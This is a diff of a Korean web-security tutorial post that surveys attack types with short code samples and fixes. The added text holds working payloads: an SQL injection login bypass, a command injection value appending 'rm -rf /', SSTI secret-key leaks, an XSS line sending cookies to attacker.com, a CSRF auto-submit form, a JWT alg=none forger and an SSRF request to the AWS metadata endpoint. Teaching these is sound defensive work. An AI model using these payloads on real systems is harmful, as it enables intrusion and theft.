@@ -1,109 +1,196 @@
 ---
-title: "주요 웹 공격 유형 한눈에 보기"
-description: "OWASP Top 10을 기반으로 SQL 인젝션, XSS, CSRF, SSRF, IDOR 등 12개 주요 웹 공격 유형을 5개 카테고리로 정리하고 각각의 최소 방어 코드를 제시합니다."
+title: "웹 공격 유형 총정리: 주요 공격의 작동 원리"
+description: "웹 애플리케이션을 위협하는 주요 공격 유형을 분류하고 각 공격의 작동 원리를 설명합니다. 인젝션, 클라이언트 사이드 공격, 접근 제어 우회, 서버 사이드 공격, DoS까지 한눈에 정리합니다."
 author: "PALDYN Team"
-pubDate: "2026-05-31"
-archiveOrder: 6
+pubDate: "2026-06-09"
+archiveOrder: 9
 type: "knowledge"
 category: "Security"
-tags: ["공격유형", "OWASP", "SQLinjection", "XSS", "CSRF", "SSRF", "IDOR"]
+tags: ["웹공격", "SQL Injection", "XSS", "CSRF", "SSRF", "OWASP"]
 featured: false
 draft: false
 ---
 
-[지난 글](/posts/websec-security-mindset/)에서 보안 사고방식을 다뤘다. 이제 그 사고방식을 구체적인 공격 유형에 적용해보자. 이 글은 시리즈 전체에서 다룰 공격들의 **항법 지도(Navigation Map)**다. 각 공격이 어떤 카테고리에 속하고, 핵심 방어 원칙이 무엇인지 한눈에 파악할 수 있다.
+[지난 글](/posts/websec-security-mindset/)에서 보안 마인드셋으로 공격자의 시각을 익혔다. 이제 실제로 어떤 공격들이 존재하는지 큰 그림을 그려보자. 웹 공격 유형을 체계적으로 이해하면 방어 전략을 세울 때 "어디에 무엇을 적용해야 하는가?"라는 질문에 빠르게 답할 수 있다. 이 글은 이후 각 공격을 심층 분석하는 글들의 네비게이션 역할을 한다.
 
-## 공격 유형 분류
+## 공격 분류 맵
 
-웹 공격은 공격 대상과 메커니즘에 따라 크게 5개 카테고리로 나뉜다.
+![웹 공격 유형 분류 맵](/assets/posts/websec-common-attack-types-map.svg)
 
-![주요 웹 공격 유형 전체 지도](/assets/posts/websec-common-attack-types-overview.svg)
+웹 공격을 다섯 가지 대분류로 정리한다.
 
-## 1. 인젝션 공격
+```text
+분류 기준: 공격 목표와 메커니즘
+1. 인젝션      — 악성 코드를 데이터처럼 삽입
+2. 클라이언트  — 브라우저·사용자를 공격 도구로 활용
+3. 접근 제어   — 인증·인가 체계 우회
+4. 서버 사이드 — 서버 자체를 공격 도구로 활용
+5. 가용성 공격 — 서비스를 마비시키거나 느리게
+```
 
-인젝션은 공격자가 애플리케이션이 신뢰하는 채널에 악성 코드나 명령을 주입하는 공격이다. 애플리케이션이 입력과 코드를 구분하지 못할 때 발생한다.
+## 1. 인젝션 (Injection)
 
-**SQL 인젝션**: 입력값이 SQL 쿼리에 직접 포함되면, 공격자가 쿼리 구조를 바꿀 수 있다.
+인젝션은 OWASP Top 10의 3위(2021년)에 올라 있는 가장 고전적이고 위험한 공격군이다. 핵심 원리는 하나다. **신뢰되지 않은 데이터가 명령어의 일부로 해석된다.**
+
+![SQL Injection 공격 흐름](/assets/posts/websec-common-attack-types-flow.svg)
+
+### SQL Injection
 
 ```sql
--- 원래 의도한 쿼리
-SELECT * FROM users WHERE username='alice' AND password='secret'
-
--- 공격 입력: username = "' OR '1'='1' --"
-SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'
--- 결과: 모든 사용자가 반환됨 (OR 1=1이 항상 참)
+-- 공격자 입력: username = "admin' --"
+-- 생성된 쿼리:
+SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
+-- '--' 이후 주석 처리 → 비밀번호 검증 건너뜀
 ```
 
-**NoSQL 인젝션**: MongoDB 같은 NoSQL DB도 안전하지 않다.
+### Command Injection
 
-```javascript
-// 취약: JSON 페이로드 직접 사용
-const user = await db.users.findOne({ username: req.body.username });
+```python
+# 취약한 코드
+import subprocess
+def ping_host(hostname):
+    # ❌ 사용자 입력을 셸 명령어에 직접 삽입
+    result = subprocess.run(f"ping -c 1 {hostname}", shell=True, ...)
+    # hostname = "google.com; rm -rf /"
 
-// 공격: {"username": {"$gt": ""}} → 모든 사용자 매칭
-// 안전: 타입 강제
-const username = String(req.body.username);
+# 안전한 코드
+def ping_host_safe(hostname):
+    # ✅ 리스트 형태 + shell=False
+    result = subprocess.run(["ping", "-c", "1", hostname], shell=False, ...)
 ```
 
-**명령어 인젝션**: `os.system()`, `subprocess`, 셸 명령 실행 시 사용자 입력이 들어가면 위험하다.
+### SSTI (Server-Side Template Injection)
 
-## 2. 클라이언트 측 공격
+```python
+# Flask/Jinja2 취약한 예시
+@app.route('/greet')
+def greet():
+    name = request.args.get('name')
+    # ❌ 사용자 입력을 템플릿 문자열로 렌더링
+    return render_template_string(f"Hello {name}!")
+    # name = "{{7*7}}" → "Hello 49!" (템플릿 실행됨)
+    # name = "{{config.SECRET_KEY}}" → 시크릿 키 노출!
+```
 
-피해자의 브라우저를 매개로 공격자가 원하는 동작을 수행시키는 공격이다.
+## 2. 클라이언트 사이드 공격
 
-**XSS(Cross-Site Scripting)**: 공격자가 악성 스크립트를 페이지에 주입해 피해자 브라우저에서 실행되게 한다. 세션 쿠키 탈취, 피싱 페이지 주입이 가능하다. 반사형(URL 파라미터), 저장형(DB 저장 후 다른 사용자에게 노출), DOM 기반(클라이언트 코드)의 세 종류가 있다.
+### XSS (Cross-Site Scripting)
 
-**CSRF(Cross-Site Request Forgery)**: 피해자가 의도하지 않은 요청을 인증된 상태로 전송하게 만든다. 피해자가 로그인된 상태에서 공격자 사이트를 방문하면 공격자 사이트가 피해자 이름으로 은행 송금을 요청할 수 있다.
+```html
+<!-- Reflected XSS -->
+<!-- URL: /search?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script> -->
+<h2>검색 결과: <script>document.location=...</script></h2>
+<!-- 스크립트가 피해자 브라우저에서 실행 → 쿠키 탈취 -->
 
-**클릭재킹**: 투명한 iframe을 통해 피해자가 보이는 버튼과 다른 버튼을 클릭하게 만든다.
+<!-- 방어: 출력 인코딩 -->
+<h2>검색 결과: &lt;script&gt;...&lt;/script&gt;</h2>
+```
 
-## 3. 인증 · 인가 공격
+### CSRF (Cross-Site Request Forgery)
 
-신원 확인(인증)이나 권한 확인(인가)을 우회하는 공격이다.
+```html
+<!-- 공격자 사이트에 숨겨진 폼 -->
+<form action="https://bank.com/transfer" method="POST">
+  <input type="hidden" name="to" value="attacker-account"/>
+  <input type="hidden" name="amount" value="1000000"/>
+</form>
+<script>document.forms[0].submit();</script>
+<!-- 피해자가 이 페이지를 열면 은행에 이체 요청이 자동 전송됨 -->
+```
 
-**브루트 포스**: 비밀번호를 자동화로 대량 시도한다. 레이트 리미팅과 계정 잠금으로 방어한다.
+## 3. 접근 제어 우회
 
-**크리덴셜 스터핑**: 다른 서비스에서 유출된 ID/비밀번호를 다른 서비스에서 시도한다. 2024년 기준 전체 로그인 시도의 40% 이상이 크리덴셜 스터핑이다.
+### IDOR (Insecure Direct Object Reference)
 
-**IDOR(Insecure Direct Object Reference)**: ID만 알면 다른 사용자의 자원에 접근할 수 있는 취약점이다. `/api/orders/1234`를 `/api/orders/1235`로 바꾸면 타인의 주문이 보이는 경우.
+```http
+# 정상 요청 (내 주문 조회)
+GET /api/orders/1234  HTTP/1.1
+Authorization: Bearer <token>
 
-**세션 하이재킹**: 유효한 세션 토큰을 탈취해 피해자로 위장한다.
+# 공격자가 다른 사람의 주문 조회
+GET /api/orders/1235  HTTP/1.1
+Authorization: Bearer <token>
+# 서버가 주문 소유자 확인 없이 응답하면 → 모든 주문 열람 가능
+```
 
-## 4. 서버 측 공격
+### JWT Algorithm Confusion
 
-서버 내부 자원이나 로직을 조작하는 공격이다. 발생 빈도는 낮지만 피해가 크다.
+```python
+# alg=none 공격
+import base64, json
 
-**SSRF(Server-Side Request Forgery)**: 서버가 공격자가 지정한 내부 URL에 요청을 보내게 만든다. AWS EC2의 인스턴스 메타데이터 서버(`169.254.169.254`)에 접근해 자격증명을 탈취하는 것이 대표적이다.
+header = {"alg": "none", "typ": "JWT"}
+payload = {"user_id": 1, "role": "admin"}
 
-**XXE(XML External Entity)**: XML 파서가 외부 엔티티를 처리할 때 로컬 파일이나 내부 서비스에 접근한다.
+# 서명 없이 토큰 조작
+fake_token = (
+    base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
+    + "."
+    + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
+    + "."  # 서명 없음
+)
+# 서버가 alg=none을 허용하면 → 서명 없이 admin 권한
+```
 
-**안전하지 않은 역직렬화**: 직렬화된 객체를 복원할 때 공격자가 조작한 객체를 실행한다. Python의 `pickle`, Java의 `ObjectInputStream`이 위험하다.
+## 4. 서버 사이드 공격
 
-## 5. 인프라 · 설정 공격
+### SSRF (Server-Side Request Forgery)
 
-애플리케이션 코드보다 인프라와 설정의 문제다. 발생 빈도가 가장 높다.
+```python
+# 취약한 URL 페칭
+@app.route('/fetch')
+def fetch_url():
+    url = request.args.get('url')
+    # ❌ 사용자 제공 URL을 서버에서 직접 요청
+    response = requests.get(url)
+    # url = "http://169.254.169.254/latest/meta-data/"
+    # → AWS 메타데이터 API에 접근, IAM 키 탈취 가능!
+```
 
-**보안 설정 오류**: 기본 자격증명 사용, 불필요한 서비스 활성화, 과도한 CORS 정책이 해당한다.
+## 5. 가용성 공격
 
-**의존성 취약점**: 취약한 버전의 라이브러리 사용. 2021년 Log4Shell은 수억 개 서비스에 영향을 미쳤다.
+```python
+# ReDoS — 정규식 서비스 거부
+import re, time
 
-**DDoS**: 대량 트래픽으로 서비스를 마비시킨다.
+# ❌ 취약한 정규식 (지수적 백트래킹)
+pattern = r'^(a+)+$'
+start = time.time()
+re.match(pattern, 'a' * 30 + '!')  # CPU 수초~수십초 독점
+# 서버가 이 요청 하나로 마비될 수 있음
 
-**로깅 · 모니터링 부재**: 공격이 발생해도 탐지하지 못하는 상태. OWASP 2021에서 새롭게 Top 10에 진입했다.
+# ✅ 타임아웃 설정 또는 안전한 정규식 사용
+import signal
+def timeout_handler(signum, frame):
+    raise TimeoutError
+signal.signal(signal.SIGALRM, timeout_handler)
+signal.alarm(1)  # 1초 제한
+```
 
-![공격 유형별 최소 방어 코드](/assets/posts/websec-common-attack-types-code.svg)
+## 공격 체인: 실제 공격은 복합적
 
-## 공격 유형 간 연관성
+실제 침해 사고의 대부분은 단일 취약점이 아니라 여러 공격이 연쇄된다.
 
-이 공격들은 독립적이지 않다. XSS로 세션 쿠키를 탈취하면 세션 하이재킹으로 이어진다. SSRF로 내부 자격증명을 훔치면 권한 상승으로 연결된다. 공격자는 항상 여러 취약점을 체인으로 연결한다.
+```text
+예시: 데이터 탈취 공격 체인
 
-이 시리즈의 3부(OWASP Top 10)에서 각 공격을 상세히 다룬다. 지금은 전체 지도를 머릿속에 그려두는 것으로 충분하다.
+1단계: SQLi로 DB 크리덴셜 획득
+2단계: 탈취한 크리덴셜로 관리자 로그인
+3단계: 관리자 페이지의 파일 업로드로 웹쉘 설치
+4단계: 웹쉘로 서버 내부망 접근
+5단계: 내부망 DB 서버에서 전체 고객 데이터 추출
+
+각 단계마다 하나의 방어가 성공했다면 연쇄가 끊어졌을 것이다
+→ 심층 방어의 중요성
+```
+
+이 시리즈의 이후 글들은 각 공격 유형을 더 깊이 다룬다. HTTP 기초부터 시작해서 각 취약점의 원리, 데모, 방어 코드까지 순서대로 배워나갈 예정이다.
 
 ---
 
-**지난 글:** [보안 사고방식 기르기](/posts/websec-security-mindset/)
+**지난 글:** [보안 마인드셋: 개발자가 가져야 할 보안 사고방식](/posts/websec-security-mindset/)
 
-**다음 글:** [HTTP 프로토콜과 보안 기초](/posts/websec-http-security-basics/)
+**다음 글:** [HTTP 보안 기초: 웹 보안의 기반이 되는 프로토콜 이해](/posts/websec-http-security-basics/)
 
 <br>
 읽어주셔서 감사합니다. 😊
